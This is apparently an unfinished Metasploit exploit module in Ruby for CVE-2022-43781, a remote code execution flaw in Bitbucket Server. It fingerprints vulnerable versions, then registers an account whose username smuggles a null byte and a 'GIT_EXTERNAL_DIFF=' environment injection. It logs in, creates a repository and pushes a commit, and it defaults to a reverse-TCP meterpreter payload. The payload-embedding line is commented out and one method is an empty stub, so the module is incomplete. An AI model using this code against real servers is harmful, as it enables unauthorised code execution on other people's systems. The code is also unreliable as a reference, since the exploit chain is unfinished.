##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Git
  include Msf::Exploit::Git::SmartHttp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Bitbucket Environment Variable RCE',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Ry0taK', # Vulnerability Discovery
          'y4er', # PoC and blog post
          'Shelby Pace' # Metasploit Module
        ],
        'References' => [
          [ 'URL', 'https://y4er.com/posts/cve-2022-43781-bitbucket-server-rce/'],
          [ 'CVE', '2022-43781']
        ],
        'Platform' => [ 'win', 'linux' ],
        'Privileged' => false,
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Targets' => [
          [
            'Linux',
            {
              'Platform' => 'linux',
              'Type' => :linux_cmd,
              'Arch' => [ ARCH_X86, ARCH_X64 ],
              'Payload' => { 'BadChars' => %(*:/?#[]@) },
              'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Windows',
            {}
          ]
        ],
        'DisclosureDate' => '2022-11-16',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(7990),
        OptString.new('USERNAME', [ false, 'User name to log in with' ]),
        OptString.new('PASSWORD', [ false, 'Password to log in with' ]),
        OptString.new('TARGETURI', [ true, 'The URI of the Bitbucket instance', '/']),
        OptBool.new('USE_PUBLIC_SIGNUP', [ true, 'Attempt to create an account through public signup if enabled', true ])
      ]
    )
  end

  def check
    res = request_login_page

    return CheckCode::Unknown('Failed to retrieve a response from the target') unless res
    return CheckCode::Safe('Target does not appear to be Bitbucket') unless res.body.include?('Bitbucket')

    nokogiri_data = res.get_html_document
    footer = nokogiri_data&.at('footer')
    return CheckCode::Detected('Failed to retrieve version information from Bitbucket') unless footer

    version_info = footer.at('span')&.children&.text
    return CheckCode::Detected('Failed to find version information in footer section') unless version_info

    vers_matches = version_info.match(/v(\d+\.\d+\.\d+)/)
    return CheckCode::Detected('Failed to find version info in expected format') unless vers_matches && vers_matches.length > 1

    version_str = vers_matches[1]

    vprint_status("Found version #{version_str} of Bitbucket")
    # vers_no = Rex::Version.new(version_str)
    major, minor, revision = version_str.split('.')
    rev_num = revision.to_i

    case major
    when '7'
      case minor
      when '0', '1', '2', '3', '4', '5'
        return CheckCode::Appears
      when '6'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 18
      when '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'
        return CheckCode::Appears
      when '17'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 11
      when '18', '19', '20'
        return CheckCode::Appears
      when '21'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 5
      end
    when '8'
      print_status('Versions 8.* are vulnerable only if the mesh setting is disabled')
      case minor
      when '0'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 4
      when '1'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 4
      when '2'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 3
      when '3'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 2
      when '4'
        return CheckCode::Appears if rev_num == 0 || rev_num == 1
      end
    end

    CheckCode::Detected
  end

  def validate_credentials(username, password)
    username ||= datastore['USERNAME']
    password ||= datastore['PASSWORD']

    [ username, password ]
  end

  def request_login_page
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'keep_cookies' => true
    )
  end

  # signup page will return 302 and redirect to login page
  # if public signup is disabled
  def public_signup_available?
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'signup'),
      'keep_cookies' => true
    )

    return false unless res
    return true if res.code == 200 && res.body.include?('Sign up')

    print_status('Public signup is not enabled')
    false
  end

  def create_account
    u_name = Faker::Internet.username
    email = Faker::Internet.email
    full_name = Faker::Name.name
    pass = Faker::Internet.password

    #    u_name_payload = "#{u_name}\u0000GIT_EXTERNAL_DIFF=$(#{payload.encoded})"
    u_name_payload = "#{u_name}\u0000GIT_EXTERNAL_DIFF="

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'signup'),
      'keep_cookies' => true,
      'vars_post' => {
        'username' => u_name_payload,
        'fullname' => full_name,
        'email' => email,
        'password' => pass,
        'confirmPassword' => pass,
        'submit' => 'Sign Up'
      }
    )

    unless res && res.code == 302 && res.headers['Location'].include?('signedUp')
      fail_with(Failure::UnexpectedReply, 'Account creation failed')
    end

    print_good('Account creation was successful!' + " #{pass}")
    [ u_name_payload, pass ]
  end

  def repo_name
    @repo_name ||= Rex::Text.rand_text_alpha(5..9)
  end

  def default_branch
    @default_branch ||= Rex::Text.rand_text_alpha(5..9)
  end

  def log_in(username, password)
    res = request_login_page
    fail_with(Failure::UnexpectedReply, 'Failed to access login page') unless res&.body&.include?('login')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'j_atl_security_check'),
      'keep_cookies' => true,
      'vars_post' => {
        'j_username' => username,
        'j_password' => password,
        'submit' => 'Log in'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Didn\'t retrieve a response') unless res
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'dashboard'),
      'keep_cookies' => true
    )

    fail_with(Failure::UnexpectedReply, 'No response from the dashboard') unless res
    unless res.body.include?('Logged in')
      fail_with(Failure::UnexpectedReply, 'Failed to log in. Please check credentials')
    end
  end

  def create_repository(username)
    repo_uri = normalize_uri(target_uri.path, 'users', username, 'repos?create')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => repo_uri,
      'keep_cookies' => true
    )

    fail_with(Failure::UnexpectedReply, 'Failed to access repo creation page') unless res

    html_doc = res.get_html_document
    token_data = html_doc.at('div//input[@name="atl_token"]')
    fail_with(Failure::UnexpectedReply, 'Failed to find element containing \'atl_token\'') unless token_data

    token = token_data['value']
    fail_with(Failure::UnexpectedReply, 'No token found') if token.blank?

    dropdown_data = html_doc.at('li[@class="user-dropdown"]')
    fail_with(Failure::UnexpectedReply, 'Failed to find dropdown to retrieve email address') if dropdown_data.blank?
    email = dropdown_data&.at('span')&.[]('data-emailaddress')
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve email address from response') if email.blank?

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => repo_uri,
      'vars_post' => {
        'name' => repo_name,
        'defaultBranchId' => default_branch,
        'description' => '',
        'scmId' => 'git',
        'forkable' => 'false',
        'atl_token' => token,
        'submit' => 'Create repository'
      },
      'keep_cookies' => true
    )

    fail_with(Failure::UnexpectedReply, 'Not response received from repo creation') unless res
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'users', username, 'repos', repo_name, 'browse')
    )

    fail_with(Failure::UnexpectedReply, 'Repository was not created') if res&.code == 404
    print_good("Successfully created repository #{repo_name}")

    email
  end

  def create_commit(username, email)
    # create a text file with random text
    txt_data = Rex::Text.rand_text_alpha(5..20)
    blob_object = GitObject.build_blob_object(txt_data)
    file_name = "#{Rex::Text.rand_text_alpha(4..10)}.txt"

    file_data = {
      mode: '100755',
      file_name: file_name,
      sha1: blob_object.sha1
    }
    tree_obj = GitObject.build_tree_object(file_data)

    commit_obj = GitObject.build_commit_object({ tree_sha1: tree_obj.sha1, email: email })

    # create a packfile for repo and push to default branch
    refs = {
      'HEAD' => "refs/head/#{default_branch}",
      "refs/head/#{default_branch}" => commit_obj.sha1
    }

    git_uri = normalize_uri(target_uri.path, "scm/~#{username}/#{repo_name}.git")
    res = send_receive_pack_request(
      git_uri,
      refs['HEAD'],
      [ commit_obj, tree_obj, blob_object ],
      '0' * 40 # no commits should exist yet, so no branch tip in repo yet
    )

    fail_with(Failure::UnexpectedReply, 'Failed to push commit to repository') unless res
    fail_with(Failure::UnexpectedReply, 'Git push failed') unless res.body.include?('unpack ok')

    commit_obj.sha1
  end

  def change_username; end

  def exploit
    datastore['GIT_USERNAME'] = datastore['USERNAME']
    datastore['GIT_PASSWORD'] = datastore['PASSWORD']

    @using_public_account = datastore['USE_PUBLIC_SIGNUP']
    if public_signup_available? && datastore['USE_PUBLIC_SIGNUP']
      username, password = create_account
      @using_public_account = (username && password ? true : false)
    end

    username, password = validate_credentials(username, password)
    fail_with(Failure::BadConfig, 'No credentials to log in with.') unless username && password

    log_in(username, password)
    unless @using_public_account
      change_username
    end

    email = create_repository(username)
    commit_sha = create_commit(username, email)
    print_good("Commit added: #{commit_sha}")
  end
end
